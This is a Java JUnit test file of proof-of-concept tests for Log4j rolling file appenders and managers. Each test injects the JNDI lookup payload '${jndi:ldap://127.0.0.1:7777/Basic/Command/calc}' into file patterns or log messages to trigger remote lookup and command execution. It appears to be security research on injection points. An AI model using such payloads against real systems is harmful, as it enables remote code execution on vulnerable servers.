import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.core.Filter;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.LoggerContext;
import org.apache.logging.log4j.core.appender.RollingFileAppender;
import org.apache.logging.log4j.core.appender.RollingRandomAccessFileAppender;
import org.apache.logging.log4j.core.appender.rolling.*;
import org.apache.logging.log4j.core.config.Configuration;
import org.apache.logging.log4j.core.config.DefaultConfiguration;
import org.apache.logging.log4j.core.filter.ThresholdFilter;
import org.apache.logging.log4j.core.impl.MutableLogEvent;
import org.apache.logging.log4j.core.layout.PatternLayout;
import org.junit.jupiter.api.Test;

import java.io.File;

public class FileManagerPocsTests {

    @Test
    public void buildRollingFileManager() {
        PatternLayout layout = PatternLayout.newBuilder()
                .withConfiguration(new DefaultConfiguration())
                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
                .build();

        RollingFileAppender appender = RollingFileAppender.newBuilder().setConfiguration(new DefaultConfiguration())
                .withFileName("app.log")
                .withFilePattern("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}")
                .setLayout(layout)
                .withAppend(true)
                .setName("RollingFile")
                .withPolicy(OnStartupTriggeringPolicy.createPolicy(1))
                .withStrategy(DefaultRolloverStrategy.newBuilder()
                        .withMax(String.valueOf(3))
                        .withConfig(new DefaultConfiguration())
                        .withFileIndex("min")
                        .build())
                .build();

        appender.getManager().rollover();
    }

    @Test
    public void setTriggerPolicyRollingFileManagerTest() {
        PatternLayout layout = PatternLayout.newBuilder()
                .withConfiguration(new DefaultConfiguration())
                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
                .build();

        RollingFileAppender appender = RollingFileAppender.newBuilder().setConfiguration(new DefaultConfiguration())
                .withFileName("app.log")
                .withFilePattern("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}")
                .setLayout(layout)
                .withAppend(true)
                .setName("RollingFile")
                .withPolicy(CronTriggeringPolicy.createPolicy(new DefaultConfiguration(), "false", "0 * * * * ?"))
                .withStrategy(DefaultRolloverStrategy.newBuilder()
                        .withMax(String.valueOf(3))
                        .withConfig(new DefaultConfiguration())
                        .withFileIndex("min")
                        .build())
                .build();

        appender.getManager().setTriggeringPolicy(OnStartupTriggeringPolicy.createPolicy(1));
    }

    @Test
    public void getFileManagerRollingFileManagerTest() {
        TriggeringPolicy policy = CronTriggeringPolicy.createPolicy(new DefaultConfiguration(), "true", "0 * * * * ?");
        RolloverStrategy strategy = DefaultRolloverStrategy.newBuilder()
                .withMax(String.valueOf(3))
                .withConfig(new DefaultConfiguration())
                .withFileIndex("min")
                .build();
        PatternLayout layout = PatternLayout.newBuilder()
                .withConfiguration(new DefaultConfiguration())
                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
                .build();
        Configuration config = new DefaultConfiguration();

        // First execute add manager into MAP
        RollingFileManager.getFileManager(
                "app.log", "", true, false, policy, strategy, null, layout, 1024, true, false, null, null, null, config);

        // Second call executes updateData from MAP
        RollingFileManager.getFileManager(
                "app.log", "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}", true, false, policy, strategy, null, layout, 1024, true, false, null, null, null, config);

    }

    @Test
    public void getFileManagerRollingRandomAccessFileManagerTest() {
        TriggeringPolicy policy = CronTriggeringPolicy.createPolicy(new DefaultConfiguration(), "true", "0 * * * * ?");
        RolloverStrategy strategy = DefaultRolloverStrategy.newBuilder()
                .withMax(String.valueOf(3))
                .withConfig(new DefaultConfiguration())
                .withFileIndex("min")
                .build();
        PatternLayout layout = PatternLayout.newBuilder()
                .withConfiguration(new DefaultConfiguration())
                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
                .build();
        Configuration config = new DefaultConfiguration();

        // First execute add manager into MAP
        RollingRandomAccessFileManager.getFileManager(
                "app.log", "", true, false, policy, strategy, null, layout, 1024, true, false, null, null, null, config);

        // Second call executes updateData from MAP
        RollingRandomAccessFileManager.getFileManager(
                "app.log", "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}", true, false, policy, strategy, null, layout, 1024, true, false, null, null, null, config);

    }

    @Test
    public void cronTriggerPolicyTest() {
        PatternLayout layout = PatternLayout.newBuilder()
                .withConfiguration(new DefaultConfiguration())
                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
                .build();

        RollingFileAppender appender = RollingFileAppender.newBuilder().setConfiguration(new DefaultConfiguration())
                .withFileName("app.log")
                .withFilePattern("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}")
                .setLayout(layout)
                .withAppend(true)
                .setName("RollingFile")
                .withPolicy(CronTriggeringPolicy.createPolicy(new DefaultConfiguration(), "true", "0 * * * * ?"))
                .withStrategy(DefaultRolloverStrategy.newBuilder()
                        .withMax(String.valueOf(3))
                        .withConfig(new DefaultConfiguration())
                        .withFileIndex("min")
                        .build())
                .build();
    }

    @Test
    public void appendRollingFileAppenderTest() {
        PatternLayout layout = PatternLayout.newBuilder()
                .withConfiguration(new DefaultConfiguration())
                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
                .build();

        RollingFileAppender appender = RollingFileAppender.newBuilder().setConfiguration(new DefaultConfiguration())
                .withFileName("app.log")
                .withFilePattern("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}")
                .setLayout(layout)
                .withAppend(true)
                .setName("RollingFile")
                .withPolicy(SizeBasedTriggeringPolicy.createPolicy("1B"))
                .withStrategy(DefaultRolloverStrategy.newBuilder()
                        .withMax(String.valueOf(3))
                        .withConfig(new DefaultConfiguration())
                        .withFileIndex("min")
                        .build())
                .build();

        LogEvent logEvent = new MutableLogEvent(new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"), null);
        appender.getManager().writeBytes("asdasdasd1".getBytes(), 0, 10);
        appender.append(logEvent);
    }

    @Test
    public void createAppenderRollingFileAppenderTest() {
        Filter fileInfoFilter = ThresholdFilter.createFilter(Level.ERROR, Filter.Result.DENY, Filter.Result.ACCEPT);

        PatternLayout layout = PatternLayout.newBuilder()
                .withConfiguration(new DefaultConfiguration())
                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
                .build();

        RollingFileAppender.createAppender("app.log", "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}", null, "RollingFile", "true", "4000", "true", CronTriggeringPolicy.createPolicy(new DefaultConfiguration(), "true", "0 * * * * ?"), DefaultRolloverStrategy.newBuilder()
                .withMax(String.valueOf(3))
                .withConfig(new DefaultConfiguration())
                .withFileIndex("min")
                .build(), layout, fileInfoFilter, null, null, "", new DefaultConfiguration());
    }

    @Test
    public void createAppenderRollingRandomAccessFileAppenderTest() {
        Filter fileInfoFilter = ThresholdFilter.createFilter(Level.ERROR, Filter.Result.DENY, Filter.Result.ACCEPT);

        PatternLayout layout = PatternLayout.newBuilder()
                .withConfiguration(new DefaultConfiguration())
                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
                .build();

        RollingRandomAccessFileAppender.createAppender("app.log", "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}", null, "RollingFile", "true", "4000",  CronTriggeringPolicy.createPolicy(new DefaultConfiguration(), "true", "0 * * * * ?"), DefaultRolloverStrategy.newBuilder()
                .withMax(String.valueOf(3))
                .withConfig(new DefaultConfiguration())
                .withFileIndex("min")
                .build(), layout, fileInfoFilter, null, null, "",  new DefaultConfiguration());
    }

}

